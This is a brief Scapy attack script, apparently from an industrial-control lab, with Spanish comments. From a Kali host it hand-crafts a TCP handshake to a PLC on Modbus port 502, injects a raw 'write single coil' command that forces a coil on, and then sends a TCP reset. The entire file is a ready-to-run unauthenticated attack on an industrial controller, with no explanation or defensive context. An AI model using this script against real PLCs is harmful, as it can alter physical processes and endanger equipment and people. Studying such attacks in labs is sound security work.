from scapy.all import *

IP_VICTIMA = "192.168.70.129"
IP_KALI = "192.168.70.150"
PORT = 502

# 1. 3-Way Handshake
syn = IP(src=IP_KALI, dst=IP_VICTIMA)/TCP(sport=49152, dport=PORT, flags="S", seq=1000)
syn_ack = sr1(syn) # Espera el SYN-ACK del PLC
ack = IP(src=IP_KALI, dst=IP_VICTIMA)/TCP(sport=49152, dport=PORT, flags="A", seq=1001, ack=syn_ack.seq + 1)
send(ack)

# 2. Comando Modbus y posterior RST
cmd = IP(src=IP_KALI, dst=IP_VICTIMA)/TCP(sport=49152, dport=PORT, flags="PA", seq=1001, ack=syn_ack.seq + 1)/Raw(load=bytes.fromhex("00010000000601050001ff00"))
rst = IP(src=IP_KALI, dst=IP_VICTIMA)/TCP(sport=49152, dport=PORT, flags="R", seq=1002)

send(cmd)
send(rst)
